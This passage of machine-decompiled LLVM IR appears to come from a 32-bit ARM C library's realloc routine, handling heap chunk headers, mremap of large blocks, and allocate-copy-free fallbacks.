  %v0_1c174 = load i32, i32* @r5, align 4
  %v1_1c174 = add i32 %v0_1c174, -4
  %v2_1c174 = inttoptr i32 %v1_1c174 to i32*
  %v3_1c174 = load i32, i32* %v2_1c174, align 4
  store i32 %v3_1c174, i32* %r2.global-to-local, align 4
  %v2_1c178 = icmp ugt i32 %v1_1c170, 14
  %v7_1c178 = icmp eq i32 %v1_1c170, 15
  %v2_1c17c = xor i1 %v2_1c178, true
  %v3_1c17c = or i1 %v7_1c178, %v2_1c17c
  br i1 %v3_1c17c, label %bb, label %bb27

bb:                                               ; preds = %dec_label_pc_1c170
  store i32 16, i32* @sb, align 4
  br label %bb27

bb27:                                             ; preds = %dec_label_pc_1c170, %bb
  %v2_1c180 = xor i1 %v7_1c178, true
  %v3_1c180 = and i1 %v2_1c178, %v2_1c180
  br i1 %v3_1c180, label %bb28, label %bb29

bb28:                                             ; preds = %bb27
  %v5_1c180 = and i32 %v1_1c170, -8
  store i32 %v5_1c180, i32* @sb, align 4
  br label %bb29

bb29:                                             ; preds = %bb27, %bb28
  %v1_1c184 = and i32 %v3_1c174, 2
  %v2_1c184 = icmp eq i32 %v1_1c184, 0
  %v1_1c188 = add i32 %v0_1c174, -8
  store i32 %v1_1c188, i32* @sl, align 4
  %v1_1c18c = and i32 %v3_1c174, -4
  store i32 %v1_1c18c, i32* @r6, align 4
  br i1 %v2_1c184, label %dec_label_pc_1c194, label %dec_label_pc_1c36c

dec_label_pc_1c194:                               ; preds = %bb29
  %v1_1c194 = load i32, i32* @sb, align 4
  %v3_1c194 = icmp ult i32 %v1_1c18c, %v1_1c194
  br i1 %v3_1c194, label %dec_label_pc_1c1a0, label %bb30

bb30:                                             ; preds = %dec_label_pc_1c194
  store i32 %v1_1c18c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1c304

dec_label_pc_1c1a0:                               ; preds = %dec_label_pc_1c194
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_1c1a8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 64) to i32*), align 4
  store i32 %v4_1c1a8, i32* %r0.global-to-local, align 4
  %v1_1c1ac = add i32 %v4_1c1a8, 44
  %v2_1c1ac = inttoptr i32 %v1_1c1ac to i32*
  %v3_1c1ac = load i32, i32* %v2_1c1ac, align 4
  store i32 %v3_1c1ac, i32* %r3.global-to-local, align 4
  %v2_1c1b0 = add i32 %v1_1c18c, %v1_1c188
  store i32 %v2_1c1b0, i32* @r4, align 4
  %v9_1c1b4 = icmp eq i32 %v2_1c1b0, %v3_1c1ac
  %v1_1c1b8 = add i32 %v2_1c1b0, 4
  %v2_1c1b8 = inttoptr i32 %v1_1c1b8 to i32*
  %v3_1c1b8 = load i32, i32* %v2_1c1b8, align 4
  store i32 %v3_1c1b8, i32* %r1.global-to-local, align 4
  br i1 %v9_1c1b4, label %dec_label_pc_1c1c0, label %dec_label_pc_1c1fc

dec_label_pc_1c1c0:                               ; preds = %dec_label_pc_1c1a0
  %v1_1c1c0 = and i32 %v3_1c1b8, -4
  %v2_1c1c4 = add i32 %v1_1c1c0, %v1_1c18c
  store i32 %v2_1c1c4, i32* %r1.global-to-local, align 4
  %v1_1c1c8 = add i32 %v1_1c194, 16
  store i32 %v1_1c1c8, i32* %r3.global-to-local, align 4
  %v3_1c1cc = icmp ult i32 %v2_1c1c4, %v1_1c1c8
  br i1 %v3_1c1cc, label %dec_label_pc_1c250, label %dec_label_pc_1c1d4

dec_label_pc_1c1d4:                               ; preds = %dec_label_pc_1c1c0
  %v2_1c1d4 = sub i32 %v2_1c1c4, %v1_1c194
  %v1_1c1d8 = urem i32 %v3_1c174, 2
  %v2_1c1dc = add i32 %v1_1c194, %v1_1c188
  store i32 %v2_1c1dc, i32* %r1.global-to-local, align 4
  %v2_1c1e0 = or i32 %v1_1c194, %v1_1c1d8
  store i32 %v2_1c1e0, i32* %r2.global-to-local, align 4
  %v1_1c1e4 = or i32 %v2_1c1d4, 1
  store i32 %v1_1c1e4, i32* %r3.global-to-local, align 4
  store i32 %v0_1c174, i32* @r4, align 4
  store i32 %v2_1c1e0, i32* %v2_1c174, align 4
  %v0_1c1f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_1c1f0 = load i32, i32* %r0.global-to-local, align 4
  %v2_1c1f0 = add i32 %v1_1c1f0, 44
  %v3_1c1f0 = inttoptr i32 %v2_1c1f0 to i32*
  store i32 %v0_1c1f0, i32* %v3_1c1f0, align 4
  %v0_1c1f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_1c1f4 = load i32, i32* %r1.global-to-local, align 4
  %v2_1c1f4 = add i32 %v1_1c1f4, 4
  %v3_1c1f4 = inttoptr i32 %v2_1c1f4 to i32*
  store i32 %v0_1c1f4, i32* %v3_1c1f4, align 4
  br label %dec_label_pc_1c438

dec_label_pc_1c1fc:                               ; preds = %dec_label_pc_1c1a0
  %v1_1c1fc = and i32 %v3_1c1b8, -2
  %v2_1c200 = add i32 %v1_1c1fc, %v2_1c1b0
  store i32 %v2_1c200, i32* %r3.global-to-local, align 4
  %v1_1c204 = add i32 %v2_1c200, 4
  %v2_1c204 = inttoptr i32 %v1_1c204 to i32*
  %v3_1c204 = load i32, i32* %v2_1c204, align 4
  store i32 %v3_1c204, i32* %r3.global-to-local, align 4
  %v1_1c208 = urem i32 %v3_1c204, 2
  %v2_1c208 = icmp eq i32 %v1_1c208, 0
  br i1 %v2_1c208, label %dec_label_pc_1c210, label %dec_label_pc_1c250

dec_label_pc_1c210:                               ; preds = %dec_label_pc_1c1fc
  %v1_1c210 = and i32 %v3_1c1b8, -4
  store i32 %v1_1c210, i32* %r3.global-to-local, align 4
  %v2_1c214 = add i32 %v1_1c210, %v1_1c18c
  store i32 %v2_1c214, i32* %r0.global-to-local, align 4
  %v3_1c218 = icmp ult i32 %v2_1c214, %v1_1c194
  br i1 %v3_1c218, label %dec_label_pc_1c250, label %dec_label_pc_1c220

dec_label_pc_1c220:                               ; preds = %dec_label_pc_1c210
  %v1_1c220 = add i32 %v1_1c18c, %v0_1c174
  %v2_1c220 = inttoptr i32 %v1_1c220 to i32*
  %v3_1c220 = load i32, i32* %v2_1c220, align 4
  store i32 %v3_1c220, i32* %r1.global-to-local, align 4
  %v1_1c224 = add i32 %v3_1c220, 12
  %v2_1c224 = inttoptr i32 %v1_1c224 to i32*
  %v3_1c224 = load i32, i32* %v2_1c224, align 4
  store i32 %v3_1c224, i32* %r3.global-to-local, align 4
  %v9_1c228 = icmp eq i32 %v3_1c224, %v2_1c1b0
  %v1_1c22c = add i32 %v2_1c1b0, 12
  %v2_1c22c = inttoptr i32 %v1_1c22c to i32*
  %v3_1c22c = load i32, i32* %v2_1c22c, align 4
  store i32 %v3_1c22c, i32* %r2.global-to-local, align 4
  br i1 %v9_1c228, label %dec_label_pc_1c234, label %dec_label_pc_1c240

dec_label_pc_1c234:                               ; preds = %dec_label_pc_1c220
  %v1_1c234 = add i32 %v3_1c22c, 8
  %v2_1c234 = inttoptr i32 %v1_1c234 to i32*
  %v3_1c234 = load i32, i32* %v2_1c234, align 4
  store i32 %v3_1c234, i32* %r3.global-to-local, align 4
  %v9_1c238 = icmp eq i32 %v3_1c234, %v2_1c1b0
  br i1 %v9_1c238, label %dec_label_pc_1c244, label %dec_label_pc_1c240

dec_label_pc_1c240:                               ; preds = %dec_label_pc_1c220, %dec_label_pc_1c234
  %v0_1c240 = call i32 @abort()
  store i32 %v0_1c240, i32* %r0.global-to-local, align 4
  %v0_1c244.pre = load i32, i32* @r1, align 4
  %v1_1c244.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_1c244

dec_label_pc_1c244:                               ; preds = %dec_label_pc_1c234, %dec_label_pc_1c240
  %v1_1c244 = phi i32 [ %v3_1c22c, %dec_label_pc_1c234 ], [ %v1_1c244.pre, %dec_label_pc_1c240 ]
  %v0_1c244 = phi i32 [ %v3_1c220, %dec_label_pc_1c234 ], [ %v0_1c244.pre, %dec_label_pc_1c240 ]
  %v2_1c244 = add i32 %v1_1c244, 8
  %v3_1c244 = inttoptr i32 %v2_1c244 to i32*
  store i32 %v0_1c244, i32* %v3_1c244, align 4
  %v0_1c248 = load i32, i32* %r2.global-to-local, align 4
  %v1_1c248 = load i32, i32* %r1.global-to-local, align 4
  %v2_1c248 = add i32 %v1_1c248, 12
  %v3_1c248 = inttoptr i32 %v2_1c248 to i32*
  store i32 %v0_1c248, i32* %v3_1c248, align 4
  %v1_1c304.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1c304

dec_label_pc_1c250:                               ; preds = %dec_label_pc_1c1c0, %dec_label_pc_1c210, %dec_label_pc_1c1fc
  %v1_1c250 = add i32 %v1_1c194, -7
  store i32 %v1_1c250, i32* %r0.global-to-local, align 4
  %v1_1c254 = call i32 @malloc(i32 %v1_1c250)
  store i32 %v1_1c254, i32* @r0, align 4
  store i32 %v1_1c254, i32* %r1.global-to-local, align 4
  %v2_1c258 = icmp eq i32 %v1_1c254, 0
  br i1 %v2_1c258, label %bb31, label %dec_label_pc_1c264

bb31:                                             ; preds = %dec_label_pc_1c250
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_1c438

dec_label_pc_1c264:                               ; preds = %dec_label_pc_1c250
  %v1_1c26c.pre = load i32, i32* @r4, align 4
  %v1_1c264 = add i32 %v1_1c254, -4
  %v2_1c264 = inttoptr i32 %v1_1c264 to i32*
  %v3_1c264 = load i32, i32* %v2_1c264, align 4
  store i32 %v3_1c264, i32* @r3, align 4
  %v1_1c268 = add i32 %v1_1c254, -8
  store i32 %v1_1c268, i32* @r7, align 4
  %v9_1c26c = icmp eq i32 %v1_1c268, %v1_1c26c.pre
  br i1 %v9_1c26c, label %.thread2, label %dec_label_pc_1c27c

.thread2:                                         ; preds = %dec_label_pc_1c264
  %v2_1c270 = and i32 %v3_1c264, -4
  store i32 %v2_1c270, i32* %r3.global-to-local, align 4
  %v2_1c274 = load i32, i32* @r6, align 4
  %v3_1c274 = add i32 %v2_1c274, %v2_1c270
  store i32 %v3_1c274, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1c304

dec_label_pc_1c27c:                               ; preds = %dec_label_pc_1c264
  %v0_1c27c = load i32, i32* @r6, align 4
  %v1_1c27c = add i32 %v0_1c27c, -4
  store i32 %v1_1c27c, i32* @r2, align 4
  %v3_1c280 = udiv i32 %v1_1c27c, 4
  store i32 %v3_1c280, i32* @ip, align 4
  %tmp37 = and i32 %v1_1c27c, -4
  %tmp38 = icmp eq i32 %tmp37, 36
  %v2_1c288 = icmp ult i32 %v1_1c27c, 36
  %v3_1c288 = or i1 %tmp38, %v2_1c288
  %v0_1c298 = load i32, i32* @r5, align 4
  br i1 %v3_1c288, label %dec_label_pc_1c298, label %dec_label_pc_1c28c

dec_label_pc_1c28c:                               ; preds = %dec_label_pc_1c27c
  store i32 %v0_1c298, i32* @r1, align 4
  %v0_1c290 = call i32 @memcpy()
  store i32 %v0_1c290, i32* %r0.global-to-local, align 4
  br label %.thread6

dec_label_pc_1c298:                               ; preds = %dec_label_pc_1c27c
  %v1_1c298 = inttoptr i32 %v0_1c298 to i32*
  %v2_1c298 = load i32, i32* %v1_1c298, align 4
  store i32 %v2_1c298, i32* %r3.global-to-local, align 4
  %v2_1c29c = inttoptr i32 %v1_1c254 to i32*
  store i32 %v2_1c298, i32* %v2_1c29c, align 4
  %v0_1c2a0 = load i32, i32* @r5, align 4
  %v1_1c2a0 = add i32 %v0_1c2a0, 4
  %v2_1c2a0 = inttoptr i32 %v1_1c2a0 to i32*
  %v3_1c2a0 = load i32, i32* %v2_1c2a0, align 4
  store i32 %v3_1c2a0, i32* %r3.global-to-local, align 4
  %v1_1c2a4 = load i32, i32* %r1.global-to-local, align 4
  %v2_1c2a4 = add i32 %v1_1c2a4, 4
  %v3_1c2a4 = inttoptr i32 %v2_1c2a4 to i32*
  store i32 %v3_1c2a0, i32* %v3_1c2a4, align 4
  %v0_1c2a8 = load i32, i32* @r5, align 4
  %v1_1c2a8 = add i32 %v0_1c2a8, 8
  %v2_1c2a8 = inttoptr i32 %v1_1c2a8 to i32*
  %v3_1c2a8 = load i32, i32* %v2_1c2a8, align 4
  store i32 %v3_1c2a8, i32* %r3.global-to-local, align 4
  %v0_1c2ac = load i32, i32* @ip, align 4
  %v1_1c2b0 = load i32, i32* %r1.global-to-local, align 4
  %v2_1c2b0 = add i32 %v1_1c2b0, 8
  %v3_1c2b0 = inttoptr i32 %v2_1c2b0 to i32*
  store i32 %v3_1c2a8, i32* %v3_1c2b0, align 4
  %tmp39 = icmp ult i32 %v0_1c2ac, 5
  br i1 %tmp39, label %.thread6, label %dec_label_pc_1c2b8

dec_label_pc_1c2b8:                               ; preds = %dec_label_pc_1c298
  %v0_1c2b8 = load i32, i32* @r5, align 4
  %v1_1c2b8 = add i32 %v0_1c2b8, 12
  %v2_1c2b8 = inttoptr i32 %v1_1c2b8 to i32*
  %v3_1c2b8 = load i32, i32* %v2_1c2b8, align 4
  store i32 %v3_1c2b8, i32* %r3.global-to-local, align 4
  %v1_1c2bc = load i32, i32* %r1.global-to-local, align 4
  %v2_1c2bc = add i32 %v1_1c2bc, 12
  %v3_1c2bc = inttoptr i32 %v2_1c2bc to i32*
  store i32 %v3_1c2b8, i32* %v3_1c2bc, align 4
  %v0_1c2c0 = load i32, i32* @r5, align 4
  %v1_1c2c0 = add i32 %v0_1c2c0, 16
  %v2_1c2c0 = inttoptr i32 %v1_1c2c0 to i32*
  %v3_1c2c0 = load i32, i32* %v2_1c2c0, align 4
  store i32 %v3_1c2c0, i32* %r3.global-to-local, align 4
  %v0_1c2c4 = load i32, i32* @ip, align 4
  %v1_1c2c8 = load i32, i32* %r1.global-to-local, align 4
  %v2_1c2c8 = add i32 %v1_1c2c8, 16
  %v3_1c2c8 = inttoptr i32 %v2_1c2c8 to i32*
  store i32 %v3_1c2c0, i32* %v3_1c2c8, align 4
  %tmp40 = icmp ult i32 %v0_1c2c4, 7
  br i1 %tmp40, label %.thread6, label %dec_label_pc_1c2d0

dec_label_pc_1c2d0:                               ; preds = %dec_label_pc_1c2b8
  %v0_1c2d0 = load i32, i32* @r5, align 4
  %v1_1c2d0 = add i32 %v0_1c2d0, 20
  %v2_1c2d0 = inttoptr i32 %v1_1c2d0 to i32*
  %v3_1c2d0 = load i32, i32* %v2_1c2d0, align 4
  store i32 %v3_1c2d0, i32* %r3.global-to-local, align 4
  %v1_1c2d4 = load i32, i32* %r1.global-to-local, align 4
  %v2_1c2d4 = add i32 %v1_1c2d4, 20
  %v3_1c2d4 = inttoptr i32 %v2_1c2d4 to i32*
  store i32 %v3_1c2d0, i32* %v3_1c2d4, align 4
  %v0_1c2d8 = load i32, i32* @r5, align 4
  %v1_1c2d8 = add i32 %v0_1c2d8, 24
  %v2_1c2d8 = inttoptr i32 %v1_1c2d8 to i32*
  %v3_1c2d8 = load i32, i32* %v2_1c2d8, align 4
  store i32 %v3_1c2d8, i32* %r3.global-to-local, align 4
  %v1_1c2dc = load i32, i32* %r1.global-to-local, align 4
  %v2_1c2dc = add i32 %v1_1c2dc, 24
  %v3_1c2dc = inttoptr i32 %v2_1c2dc to i32*
  store i32 %v3_1c2d8, i32* %v3_1c2dc, align 4
  %v0_1c2e0 = load i32, i32* @ip, align 4
  %v7_1c2e0 = icmp eq i32 %v0_1c2e0, 9
  br i1 %v7_1c2e0, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_1c2d0
  %v1_1c2e4 = load i32, i32* @r5, align 4
  %v2_1c2e4 = add i32 %v1_1c2e4, 28
  %v3_1c2e4 = inttoptr i32 %v2_1c2e4 to i32*
  %v4_1c2e4 = load i32, i32* %v3_1c2e4, align 4
  store i32 %v4_1c2e4, i32* %r3.global-to-local, align 4
  %v2_1c2e8 = load i32, i32* %r1.global-to-local, align 4
  %v3_1c2e8 = add i32 %v2_1c2e8, 28
  %v4_1c2e8 = inttoptr i32 %v3_1c2e8 to i32*
  store i32 %v4_1c2e4, i32* %v4_1c2e8, align 4
  %v1_1c2ec = load i32, i32* @r5, align 4
  %v2_1c2ec = add i32 %v1_1c2ec, 32
  %v3_1c2ec = inttoptr i32 %v2_1c2ec to i32*
  %v4_1c2ec = load i32, i32* %v3_1c2ec, align 4
  store i32 %v4_1c2ec, i32* %r3.global-to-local, align 4
  %v2_1c2f0 = load i32, i32* %r1.global-to-local, align 4
  %v3_1c2f0 = add i32 %v2_1c2f0, 32
  %v4_1c2f0 = inttoptr i32 %v3_1c2f0 to i32*
  store i32 %v4_1c2ec, i32* %v4_1c2f0, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_1c2d0, %dec_label_pc_1c2b8, %dec_label_pc_1c298, %dec_label_pc_1c28c, %bb32
  %v0_1c2f4 = load i32, i32* @r5, align 4
  store i32 %v0_1c2f4, i32* @r0, align 4
  %v0_1c2f8 = call i32 @free()
  store i32 %v0_1c2f8, i32* %r0.global-to-local, align 4
  %v0_1c2fc = load i32, i32* @r7, align 4
  %v1_1c2fc = add i32 %v0_1c2fc, 8
  store i32 %v1_1c2fc, i32* @r4, align 4
  br label %dec_label_pc_1c438

dec_label_pc_1c304:                               ; preds = %bb30, %.thread2, %dec_label_pc_1c244
  %v0_1c318 = phi i32 [ %v3_1c274, %.thread2 ], [ %v1_1c18c, %bb30 ], [ %v1_1c304.pre, %dec_label_pc_1c244 ]
  %v0_1c304 = load i32, i32* @sb, align 4
  %v2_1c304 = sub i32 %v0_1c318, %v0_1c304
  store i32 %v2_1c304, i32* %r1.global-to-local, align 4
  %v0_1c30c = load i32, i32* @sl, align 4
  %v1_1c30c = add i32 %v0_1c30c, 4
  %v2_1c30c = inttoptr i32 %v1_1c30c to i32*
  %v3_1c30c = load i32, i32* %v2_1c30c, align 4
  %tmp41 = icmp ugt i32 %v2_1c304, 15
  %v1_1c334 = urem i32 %v3_1c30c, 2
  store i32 %v1_1c334, i32* %r3.global-to-local, align 4
  br i1 %tmp41, label %dec_label_pc_1c334, label %dec_label_pc_1c314

dec_label_pc_1c314:                               ; preds = %dec_label_pc_1c304
  %v2_1c318 = or i32 %v1_1c334, %v0_1c318
  store i32 %v2_1c318, i32* %r3.global-to-local, align 4
  store i32 %v2_1c318, i32* %v2_1c30c, align 4
  %v0_1c320 = load i32, i32* @sl, align 4
  %v1_1c320 = load i32, i32* %r0.global-to-local, align 4
  %v2_1c320 = add i32 %v1_1c320, %v0_1c320
  store i32 %v2_1c320, i32* %r2.global-to-local, align 4
  %v1_1c324 = add i32 %v2_1c320, 4
  %v2_1c324 = inttoptr i32 %v1_1c324 to i32*
  %v3_1c324 = load i32, i32* %v2_1c324, align 4
  %v1_1c328 = or i32 %v3_1c324, 1
  store i32 %v1_1c328, i32* %r3.global-to-local, align 4
  store i32 %v1_1c328, i32* %v2_1c324, align 4
  br label %dec_label_pc_1c364

dec_label_pc_1c334:                               ; preds = %dec_label_pc_1c304
  %v2_1c338 = add i32 %v0_1c30c, %v0_1c304
  store i32 %v2_1c338, i32* %r0.global-to-local, align 4
  %v2_1c33c = or i32 %v1_1c334, %v0_1c304
  store i32 %v2_1c33c, i32* %r3.global-to-local, align 4
  %v1_1c340 = or i32 %v2_1c304, 1
  store i32 %v1_1c340, i32* %r2.global-to-local, align 4
  store i32 %v2_1c33c, i32* %v2_1c30c, align 4
  %v0_1c348 = load i32, i32* %r2.global-to-local, align 4
  %v1_1c348 = load i32, i32* %r0.global-to-local, align 4
  %v2_1c348 = add i32 %v1_1c348, 4
  %v3_1c348 = inttoptr i32 %v2_1c348 to i32*
  store i32 %v0_1c348, i32* %v3_1c348, align 4
  %v0_1c34c = load i32, i32* %r0.global-to-local, align 4
  %v1_1c34c = load i32, i32* %r1.global-to-local, align 4
  %v2_1c34c = add i32 %v1_1c34c, %v0_1c34c
  store i32 %v2_1c34c, i32* %r2.global-to-local, align 4
  %v1_1c350 = add i32 %v2_1c34c, 4
  %v2_1c350 = inttoptr i32 %v1_1c350 to i32*
  %v3_1c350 = load i32, i32* %v2_1c350, align 4
  %v1_1c354 = or i32 %v3_1c350, 1
  store i32 %v1_1c354, i32* %r3.global-to-local, align 4
  store i32 %v1_1c354, i32* %v2_1c350, align 4
  %v0_1c35c = load i32, i32* %r0.global-to-local, align 4
  %v1_1c35c = add i32 %v0_1c35c, 8
  store i32 %v1_1c35c, i32* @r0, align 4
  %v0_1c360 = call i32 @free()
  store i32 %v0_1c360, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1c364

dec_label_pc_1c364:                               ; preds = %dec_label_pc_1c314, %dec_label_pc_1c334
  %v0_1c364 = load i32, i32* @sl, align 4
  %v1_1c364 = add i32 %v0_1c364, 8
  store i32 %v1_1c364, i32* @r4, align 4
  br label %dec_label_pc_1c438

dec_label_pc_1c36c:                               ; preds = %bb29
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* %r1.global-to-local, align 4
  %v4_1c374 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 64) to i32*), align 4
  store i32 %v4_1c374, i32* @r8, align 4
  %v2_1c378 = inttoptr i32 %v1_1c188 to i32*
  %v3_1c378 = load i32, i32* %v2_1c378, align 4
  store i32 %v3_1c378, i32* @r4, align 4
  %v1_1c37c = add i32 %v4_1c374, 860
  %v2_1c37c = inttoptr i32 %v1_1c37c to i32*
  %v3_1c37c = load i32, i32* %v2_1c37c, align 4
  %v1_1c380 = add i32 %v3_1c378, 4
  %v1_1c384 = add i32 %v3_1c37c, -1
  store i32 %v1_1c384, i32* %r2.global-to-local, align 4
  %v2_1c388 = add i32 %v1_1c380, %v1_1c384
  %v1_1c38c = load i32, i32* @sb, align 4
  %v2_1c38c = add i32 %v2_1c388, %v1_1c38c
  store i32 %v2_1c38c, i32* %r3.global-to-local, align 4
  %v2_1c390 = sub i32 0, %v3_1c37c
  %v3_1c390 = and i32 %v2_1c38c, %v2_1c390
  store i32 %v3_1c390, i32* @r7, align 4
  %v2_1c394 = sub i32 %v3_1c390, %v3_1c378
  store i32 %v2_1c394, i32* @fp, align 4
  %v9_1c398 = icmp eq i32 %v1_1c18c, %v2_1c394
  br i1 %v9_1c398, label %dec_label_pc_1c40c, label %dec_label_pc_1c3a0

dec_label_pc_1c3a0:                               ; preds = %dec_label_pc_1c36c
  %v2_1c3a0 = sub i32 %v1_1c188, %v3_1c378
  store i32 %v2_1c3a0, i32* %r0.global-to-local, align 4
  %v2_1c3a4 = add i32 %v3_1c378, %v1_1c18c
  store i32 %v2_1c3a4, i32* %r1.global-to-local, align 4
  store i32 %v3_1c390, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_1c3b0 = call i32 @mremap(i32 %v2_1c3a0, i32 %v2_1c3a4, i32 %v3_1c390, i32 1)
  store i32 %v4_1c3b0, i32* %r0.global-to-local, align 4
  %v7_1c3b4 = icmp eq i32 %v4_1c3b0, -1
  br i1 %v7_1c3b4, label %dec_label_pc_1c400, label %dec_label_pc_1c3bc

dec_label_pc_1c3bc:                               ; preds = %dec_label_pc_1c3a0
  %v1_1c3bc = load i32, i32* @r4, align 4
  %v2_1c3bc = add i32 %v1_1c3bc, %v4_1c3b0
  store i32 %v2_1c3bc, i32* %r0.global-to-local, align 4
  %v0_1c3c0 = load i32, i32* @fp, align 4
  %v1_1c3c0 = or i32 %v0_1c3c0, 2
  store i32 %v1_1c3c0, i32* %r3.global-to-local, align 4
  %v2_1c3c4 = add i32 %v2_1c3bc, 4
  %v3_1c3c4 = inttoptr i32 %v2_1c3c4 to i32*
  store i32 %v1_1c3c0, i32* %v3_1c3c4, align 4
  %v0_1c3c8 = load i32, i32* @r8, align 4
  %v1_1c3c8 = add i32 %v0_1c3c8, 868
  %v2_1c3c8 = inttoptr i32 %v1_1c3c8 to i32*
  %v3_1c3c8 = load i32, i32* %v2_1c3c8, align 4
  store i32 %v3_1c3c8, i32* %r3.global-to-local, align 4
  %v1_1c3cc = add i32 %v0_1c3c8, 880
  %v2_1c3cc = inttoptr i32 %v1_1c3cc to i32*
  %v3_1c3cc = load i32, i32* %v2_1c3cc, align 4
  store i32 %v3_1c3cc, i32* %r2.global-to-local, align 4
  %v0_1c3d0 = load i32, i32* @r6, align 4
  %v2_1c3d0 = sub i32 %v3_1c3c8, %v0_1c3d0
  store i32 %v2_1c3d0, i32* %r3.global-to-local, align 4
  %v1_1c3d4 = load i32, i32* @r7, align 4
  %v2_1c3d4 = add i32 %v1_1c3d4, %v2_1c3d0
  store i32 %v2_1c3d4, i32* %r1.global-to-local, align 4
  %v1_1c3d8 = add i32 %v0_1c3c8, 872
  %v2_1c3d8 = inttoptr i32 %v1_1c3d8 to i32*
  %v3_1c3d8 = load i32, i32* %v2_1c3d8, align 4
  store i32 %v3_1c3d8, i32* %r3.global-to-local, align 4
  %v1_1c3e0 = add i32 %v0_1c3c8, 884
  %v2_1c3e0 = inttoptr i32 %v1_1c3e0 to i32*
  %v3_1c3e0 = load i32, i32* %v2_1c3e0, align 4
  store i32 %v3_1c3e0, i32* %r2.global-to-local, align 4
  %tmp42 = icmp ugt i32 %v2_1c3d4, %v3_1c3cc
  br i1 %tmp42, label %bb33, label %bb34

bb33:                                             ; preds = %dec_label_pc_1c3bc
  store i32 %v2_1c3d4, i32* %v2_1c3cc, align 4
  %v0_1c3e8.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_1c3e8.pre = load i32, i32* @r8, align 4
  br label %bb34

bb34:                                             ; preds = %dec_label_pc_1c3bc, %bb33
  %v1_1c3e8 = phi i32 [ %v0_1c3c8, %dec_label_pc_1c3bc ], [ %v1_1c3e8.pre, %bb33 ]
  %v0_1c3e8 = phi i32 [ %v2_1c3d4, %dec_label_pc_1c3bc ], [ %v0_1c3e8.pre, %bb33 ]
  %v2_1c3e8 = add i32 %v1_1c3e8, 868
  %v3_1c3e8 = inttoptr i32 %v2_1c3e8 to i32*
  store i32 %v0_1c3e8, i32* %v3_1c3e8, align 4
  %v0_1c3ec = load i32, i32* %r1.global-to-local, align 4
  %v1_1c3ec = load i32, i32* %r3.global-to-local, align 4
  %v2_1c3ec = add i32 %v1_1c3ec, %v0_1c3ec
  store i32 %v2_1c3ec, i32* %r1.global-to-local, align 4
  %v1_1c3f0 = load i32, i32* %r2.global-to-local, align 4
  %v0_1c3f4 = load i32, i32* %r0.global-to-local, align 4
  %v1_1c3f4 = add i32 %v0_1c3f4, 8
  store i32 %v1_1c3f4, i32* @r4, align 4
  %tmp43 = icmp ugt i32 %v2_1c3ec, %v1_1c3f0
  br i1 %tmp43, label %bb35, label %dec_label_pc_1c438

bb35:                                             ; preds = %bb34
  %v5_1c3f8 = load i32, i32* @r8, align 4
  %v6_1c3f8 = add i32 %v5_1c3f8, 884
  %v7_1c3f8 = inttoptr i32 %v6_1c3f8 to i32*
  store i32 %v2_1c3ec, i32* %v7_1c3f8, align 4
  br label %dec_label_pc_1c438

dec_label_pc_1c400:                               ; preds = %dec_label_pc_1c3a0
  %v0_1c400 = load i32, i32* @sb, align 4
  %v1_1c400 = add i32 %v0_1c400, 4
  store i32 %v1_1c400, i32* %r3.global-to-local, align 4
  %v0_1c404 = load i32, i32* @r6, align 4
  %v3_1c404 = icmp ult i32 %v0_1c404, %v1_1c400
  br i1 %v3_1c404, label %dec_label_pc_1c414, label %dec_label_pc_1c400.dec_label_pc_1c40c_crit_edge

dec_label_pc_1c400.dec_label_pc_1c40c_crit_edge:  ; preds = %dec_label_pc_1c400
  %v0_1c40c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1c40c

dec_label_pc_1c40c:                               ; preds = %dec_label_pc_1c400.dec_label_pc_1c40c_crit_edge, %dec_label_pc_1c36c
  %v0_1c40c = phi i32 [ %v0_1c40c.pre, %dec_label_pc_1c400.dec_label_pc_1c40c_crit_edge ], [ %v0_1c174, %dec_label_pc_1c36c ]
  store i32 %v0_1c40c, i32* @r4, align 4
  br label %dec_label_pc_1c438

dec_label_pc_1c414:                               ; preds = %dec_label_pc_1c400
  %v1_1c414 = add i32 %v0_1c400, -7
  store i32 %v1_1c414, i32* %r0.global-to-local, align 4
  %v1_1c418 = call i32 @malloc(i32 %v1_1c414)
  store i32 %v1_1c418, i32* @r0, align 4
  store i32 %v1_1c418, i32* @r4, align 4
  %v2_1c41c = icmp eq i32 %v1_1c418, 0
  br i1 %v2_1c41c, label %dec_label_pc_1c438, label %dec_label_pc_1c424

dec_label_pc_1c424:                               ; preds = %dec_label_pc_1c414
  %v0_1c424 = load i32, i32* @r6, align 4
  %v1_1c424 = add i32 %v0_1c424, -8
  store i32 %v1_1c424, i32* @r2, align 4
  %v0_1c428 = load i32, i32* @r5, align 4
  store i32 %v0_1c428, i32* @r1, align 4
  %v0_1c42c = call i32 @memcpy()
  %v0_1c430 = load i32, i32* @r5, align 4
  store i32 %v0_1c430, i32* @r0, align 4
  %v0_1c434 = call i32 @free()
  store i32 %v0_1c434, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1c438

dec_label_pc_1c438:                               ; preds = %bb31, %bb35, %bb34, %dec_label_pc_1c414, %dec_label_pc_1c40c, %dec_label_pc_1c364, %.thread6, %dec_label_pc_1c1d4, %dec_label_pc_1c424
  store i32 %v2_1c120, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* %r2.global-to-local, align 4
  %v4_1c448 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 44) to i32*), align 4
